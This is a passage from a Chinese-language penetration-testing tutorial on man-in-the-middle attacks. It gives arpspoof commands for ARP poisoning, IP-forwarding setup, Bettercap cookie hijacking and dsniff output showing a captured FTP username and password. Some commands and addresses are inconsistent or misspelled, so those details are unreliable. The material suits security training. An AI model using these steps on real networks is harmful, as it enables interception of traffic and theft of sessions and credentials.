
`root@local ferret eth0`

`FERRET 3.8.1 - 2007-2012 (c) Error Security`

`-- build = Mar 27 2013 13:51:59 (32-bit)`

`libcapso: libcapso: cannot open shared object file: No such file or directory`

`Searching elsewhere for libcap`

`Found libcap`

`libcap version 1.3.0`

`1 eth0 (No description available)`

`2 nflog (Linux netfilter log (NFLOG) interface)`

`any (在所有接口上捕获的伪设备)`

`4 lo (No description available)`

`SNIFFING: eth0`

`LINKTYPE: 1 Ethernet`

```
```

# 中间人攻击

中间人攻击是一种主动监听的形式，攻击者与受害者建立连接并在受害者之间中继消息，使他们认为自己正在互相交谈。这种攻击有许多形式，例如使用 Hak5 Pineapple 路由器伪装成受信任的无线接入点，而实际上充当中间人。

## 攻击身份

一旦 Bettercap 运行，返回 Bettercap，你应该开始看到数据包。点击任何目标以查看捕获的 cookie。

![](img/df1fdcde66c92c1fef83bd651dd5ffe3_209_0.png)

点击任何 cookie 以访问捕获的会话。在我的示例中，我中继访问了 www.thesecurityblogger.com。

![](img/df1fdcde66c92c1fef83bd651dd5ffe3_209_1.png)

## 攻击身份验证

终端 1:

```
arpspoof -t 172.16.76.128 172.16.76.2 // 告诉受害者 2 你是默认网关
```

终端 2:

```
arpspoof -t 172.16.76.2 172.16.76.2 // 告诉受害者 1 你是默认网关
```

![](img/df1fdcde66c92c1fef83bd651dd5ffe3_211_0.png)

如果你正确输入了命令，你应该看到流量正在通过攻击系统进行重放。流量不会在受害者之间直接传输，此时受害者不会看到流量流出网络。为了完成攻击，你需要启用 IP 转发（IP forward），以便流量继续从默认网关流到受害者并反之，而攻击者则在监控受害者与默认网关之间的流量。

打开第三终端窗口并输入：

```
echo 1>/proc/sys/net/ipv4/ip_forward
```

![](img/df1fdcde66c92c1fef83bd651dd5ffe3_211_1.png)

此时，流量应该在受害者和默认网关之间流动并经过攻击者系统。下面的截图显示了未启用 IP 转发时 ping 失败。

接下来，启动 `dnsiff` 来捕获流量。可以在 Sniffing/Spoofing | Network Sniffers（嗅探/欺骗 | 网络嗅探器）下找到 `dnsiff`。打开的终端窗口将显示 `dnsiff` 的用法命令，如下所示：

```
Version: 2.4

Usage: dnsiff [-cdmn] [-i interface | -p pcapfile [-s snaplen]
      [-f services] [-t trigger(,...)] [-r|-w savefile]
[expression]

root@kali:-#
```

要启动 `dnsiff`，输入 `dnsiff` 并使用 `-i` 接口名称选择要嗅探的接口。例如，我输入 `dnsiff` 来嗅探 eth0 上的所有流量，如下所示：

```
root@kali:~# dnsiff -i eth0

dnsiff: listening on eth0
```

`dnsiff` 会捕获任何登录信息。例如，如果受害者通过 FTP 登录系统，一旦会话关闭，你就会看到登录尝试和凭据，`dnsiff` 需要看到整个会话。

```
5/25/13 02:15:18 tcp 172.16.76.128.44837 -> 192.168.76.2 (ftp)

USER admin

PASS password123
```
